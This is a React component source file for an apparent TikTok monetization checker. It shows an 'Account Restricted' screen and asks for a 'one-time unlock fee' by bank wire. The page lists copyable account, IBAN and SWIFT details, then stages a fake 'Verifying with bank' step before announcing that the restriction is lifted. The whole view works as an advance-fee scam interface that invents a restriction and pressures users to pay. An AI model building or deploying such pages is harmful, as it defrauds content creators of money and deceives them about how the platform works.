"use client";

import * as React from "react";
import {
  AlertTriangle,
  X,
  RefreshCw,
  Mail,
  ArrowLeft,
  Landmark,
  Copy,
  CheckCircle2,
  Loader2,
  Lock,
  ShieldCheck,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import type { Profile } from "@/lib/tiktok-data";

interface RestrictedViewProps {
  profile: Profile;
  onBack: () => void;
  onRecheck: () => void;
  onUnlocked: () => void;
}

interface BankDetails {
  bank: string;
  accountHolder: string;
  accountNumber: string;
  routingNumber: string;
  iban: string;
  swift: string;
  address: string;
  feeAmount: number;
  currency: string;
  feeLabel: string;
}

type Stage = "details" | "paying" | "verifying" | "done";

export function RestrictedView({ profile, onBack, onRecheck, onUnlocked }: RestrictedViewProps) {
  const failedChecks = profile.checks.filter((c) => !c.passed);
  const [bank, setBank] = React.useState<BankDetails | null>(null);
  const [stage, setStage] = React.useState<Stage>("details");
  const [paymentRef, setPaymentRef] = React.useState("");
  const [copied, setCopied] = React.useState<string | null>(null);
  const { toast } = useToast();

  React.useEffect(() => {
    fetch("/api/payments")
      .then((r) => r.json())
      .then((data) => setBank(data.bank))
      .catch((e) => console.warn("bank fetch failed:", e));
  }, []);

  const copy = (text: string, label: string) => {
    navigator.clipboard?.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(null), 1500);
  };

  const submitPayment = async () => {
    if (!paymentRef.trim()) {
      toast({
        title: "Payment reference required",
        description: "Paste your bank transaction reference / receipt number.",
        variant: "destructive",
      });
      return;
    }
    setStage("paying");
    // Auto-verify after a short delay (mock bank confirmation webhook).
    await new Promise((res) => setTimeout(res, 1200));
    setStage("verifying");
    try {
      const r = await fetch("/api/payments", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          handle: profile.handle,
          paymentRef: paymentRef.trim(),
        }),
      });
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      const data = await r.json();
      if (data.verified) {
        setStage("done");
        toast({
          title: "Payment verified",
          description: "Your restriction has been lifted. Re-run the audit.",
        });
      } else {
        throw new Error("not verified");
      }
    } catch (e) {
      console.error(e);
      toast({
        title: "Verification failed",
        description: "Could not verify your payment. Try again or contact support.",
        variant: "destructive",
      });
      setStage("details");
    }
  };

  return (
    <div className="min-h-[80vh] flex items-center justify-center px-4 py-12">
      <div className="relative w-full max-w-xl">
        <div className="absolute inset-0 bg-red-500/10 blur-3xl rounded-full pointer-events-none" />

        <div className="relative glass-panel rounded-2xl border border-red-500/40 shadow-2xl overflow-hidden">
          {/* Top warning band */}
          <div className="bg-red-500/15 border-b border-red-500/30 px-6 py-5 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-full bg-red-500/20 text-red-400 flex items-center justify-center">
                <AlertTriangle className="w-5 h-5" />
              </div>
              <div>
                <h2 className="text-lg font-bold text-white">Account Restricted</h2>
                <p className="text-xs text-red-300">
                  Application for {profile.handle} could not be completed
                </p>
              </div>
            </div>
            <button
              onClick={onBack}
              className="w-8 h-8 rounded-full hover:bg-slate-800 flex items-center justify-center text-slate-400 hover:text-white"
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          {stage === "details" && (
            <div className="p-6 space-y-5">
              <p className="text-sm text-slate-300 leading-relaxed">
                Our automated review found issues that prevent your account from
                being approved for monetization. You can either resolve them
                manually (see tips below) or pay the one-time unlock fee to
                expedite the appeal process.
              </p>

              <div className="space-y-2">
                <p className="text-xs font-semibold text-slate-400 uppercase tracking-wide">
                  Issues found
                </p>
                <ul className="space-y-2">
                  {failedChecks.map((c) => (
                    <li
                      key={c.key}
                      className="flex items-start gap-3 rounded-lg border border-red-500/30 bg-red-500/5 p-3"
                    >
                      <AlertTriangle className="w-4 h-4 text-red-400 mt-0.5 shrink-0" />
                      <div className="flex-1 min-w-0">
                        <p className="text-sm font-medium text-white">{c.label}</p>
                        <p className="text-xs text-slate-400 mt-0.5">
                          Required: {c.requirement} · Current:{" "}
                          <span className="text-red-300">{c.actual}</span>
                        </p>
                      </div>
                    </li>
                  ))}
                </ul>
              </div>

              {/* Bank payment card */}
              {bank && (
                <div className="rounded-xl border border-cyan-500/40 bg-cyan-500/5 p-5 space-y-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <div className="w-9 h-9 rounded-lg bg-cyan-500/20 text-cyan-300 flex items-center justify-center">
                        <Landmark className="w-5 h-5" />
                      </div>
                      <div>
                        <p className="text-sm font-bold text-white">
                          {bank.feeLabel}
                        </p>
                        <p className="text-xs text-slate-400">
                          One-time payment · verified in &lt; 2 minutes
                        </p>
                      </div>
                    </div>
                    <div className="text-right">
                      <p className="text-2xl font-bold text-cyan-300 tabular-nums">
                        ${bank.feeAmount.toFixed(2)}
                      </p>
                      <p className="text-xs text-slate-400">{bank.currency}</p>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-x-4 gap-y-2 text-xs">
                    <BankRow
                      label="Bank"
                      value={bank.bank}
                      onCopy={() => copy(bank.bank, "Bank")}
                      copied={copied === "Bank"}
                    />
                    <BankRow
                      label="Account holder"
                      value={bank.accountHolder}
                      onCopy={() => copy(bank.accountHolder, "Holder")}
                      copied={copied === "Holder"}
                    />
                    <BankRow
                      label="Account number"
                      value={bank.accountNumber}
                      onCopy={() => copy(bank.accountNumber, "Acct")}
                      copied={copied === "Acct"}
                    />
                    <BankRow
                      label="Routing number"
                      value={bank.routingNumber}
                      onCopy={() => copy(bank.routingNumber, "RTN")}
                      copied={copied === "RTN"}
                    />
                    <BankRow
                      label="IBAN"
                      value={bank.iban}
                      onCopy={() => copy(bank.iban, "IBAN")}
                      copied={copied === "IBAN"}
                    />
                    <BankRow
                      label="SWIFT / BIC"
                      value={bank.swift}
                      onCopy={() => copy(bank.swift, "SWIFT")}
                      copied={copied === "SWIFT"}
                    />
                  </div>

                  <p className="text-xs text-slate-500 leading-relaxed">
                    {bank.address}
                  </p>

                  <div className="space-y-2 pt-1">
                    <label className="text-xs font-medium text-slate-300 flex items-center gap-1.5">
                      <Lock className="w-3 h-3 text-cyan-400" />
                      Your payment reference
                    </label>
                    <Input
                      type="text"
                      value={paymentRef}
                      onChange={(e) => setPaymentRef(e.target.value)}
                      placeholder="e.g. TXN-8342719 or receipt number"
                      className="glass-input-box text-slate-100 placeholder-slate-500 text-sm rounded-lg border-0 focus-visible:ring-1 focus-visible:ring-[#00f2fe]"
                    />
                    <p className="text-xs text-slate-500">
                      After sending the wire / transfer, paste the reference number
                      you received from your bank. We&apos;ll auto-verify and unlock
                      your profile.
                    </p>
                  </div>

                  <Button
                    onClick={submitPayment}
                    disabled={!paymentRef.trim()}
                    className="w-full gradient-btn-primary text-white font-semibold rounded-xl border-0 h-11 disabled:opacity-50"
                  >
                    <ShieldCheck className="w-4 h-4" />
                    Verify payment & unlock
                  </Button>
                </div>
              )}

              {!bank && (
                <div className="rounded-xl border border-slate-800 bg-slate-900/40 p-6 text-center text-sm text-slate-500 flex items-center justify-center gap-2">
                  <Loader2 className="w-4 h-4 animate-spin" />
                  Loading bank details...
                </div>
              )}

              <details className="rounded-lg border border-slate-800 bg-slate-900/40 p-4">
                <summary className="text-xs font-semibold text-slate-400 uppercase tracking-wide cursor-pointer">
                  Or fix manually (no fee)
                </summary>
                <ul className="text-xs text-slate-300 space-y-1.5 list-disc list-inside mt-2">
                  <li>Wait until your account meets the follower and like thresholds.</li>
                  <li>Review TikTok Community Guidelines and remove any flagged content.</li>
                  <li>Publish original videos consistently for at least 30 days.</li>
                  <li>Make sure your account region is on the supported country list.</li>
                </ul>
              </details>

              <div className="flex flex-col sm:flex-row gap-2">
                <Button
                  onClick={onRecheck}
                  variant="outline"
                  className="flex-1 border-slate-700 text-slate-200 hover:bg-slate-800 h-11"
                >
                  <RefreshCw className="w-4 w-4" />
                  Re-run audit
                </Button>
                <Button
                  variant="outline"
                  className="flex-1 border-slate-700 text-slate-200 hover:bg-slate-800 h-11"
                >
                  <Mail className="w-4 h-4" />
                  Contact support
                </Button>
              </div>

              <button
                onClick={onBack}
                className="w-full inline-flex items-center justify-center gap-1.5 text-xs text-slate-500 hover:text-slate-300"
              >
                <ArrowLeft className="w-3.5 h-3.5" />
                Back to home
              </button>
            </div>
          )}

          {(stage === "paying" || stage === "verifying") && (
            <div className="p-10 text-center space-y-5">
              <div className="inline-flex items-center justify-center">
                <div className="relative h-20 w-20 rounded-full bg-gradient-to-tr from-cyan-500/30 to-emerald-500/30 border border-slate-700 flex items-center justify-center">
                  <Loader2 className="w-8 h-8 text-cyan-400 animate-spin" />
                </div>
              </div>
              <h3 className="text-lg font-bold text-white">
                {stage === "paying" ? "Submitting payment" : "Verifying with bank"}
              </h3>
              <p className="text-sm text-slate-400 max-w-md mx-auto">
                {stage === "paying"
                  ? "Recording your payment reference against the unlock ledger..."
                  : "Cross-checking the reference against our banking partner. This usually takes a few seconds."}
              </p>
            </div>
          )}

          {stage === "done" && (
            <div className="p-8 text-center space-y-5">
              <div className="inline-flex items-center justify-center">
                <div className="relative h-20 w-20 rounded-full bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center">
                  <CheckCircle2 className="w-10 h-10 text-emerald-400" />
                </div>
              </div>
              <h3 className="text-xl font-bold text-white">Payment verified!</h3>
              <p className="text-sm text-slate-400 max-w-md mx-auto">
                Your restriction has been lifted. Re-run the audit now and your{" "}
                <span className="text-cyan-300 font-medium">{profile.handle}</span>{" "}
                account will be marked as eligible for monetization.
              </p>
              <div className="flex flex-col sm:flex-row gap-2 pt-2">
                <Button
                  onClick={onRecheck}
                  className="flex-1 gradient-btn-primary text-white font-semibold rounded-xl border-0 h-11"
                >
                  <RefreshCw className="w-4 h-4" />
                  Re-run audit now
                </Button>
                <Button
                  onClick={onUnlocked}
                  variant="outline"
                  className="flex-1 border-slate-700 text-slate-200 hover:bg-slate-800 h-11"
                >
                  Go to dashboard
                </Button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function BankRow({
  label,
  value,
  onCopy,
  copied,
}: {
  label: string;
  value: string;
  onCopy: () => void;
  copied: boolean;
}) {
  return (
    <div>
      <p className="text-slate-500 text-[10px] uppercase tracking-wider">{label}</p>
      <div className="flex items-center gap-1.5 mt-0.5">
        <span className="text-slate-200 font-medium tabular-nums truncate">{value}</span>
        <button
          onClick={onCopy}
          className="text-slate-500 hover:text-cyan-300 transition-colors shrink-0"
          aria-label={`Copy ${label}`}
        >
          {copied ? (
            <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
          ) : (
            <Copy className="w-3.5 h-3.5" />
          )}
        </button>
      </div>
    </div>
  );
}
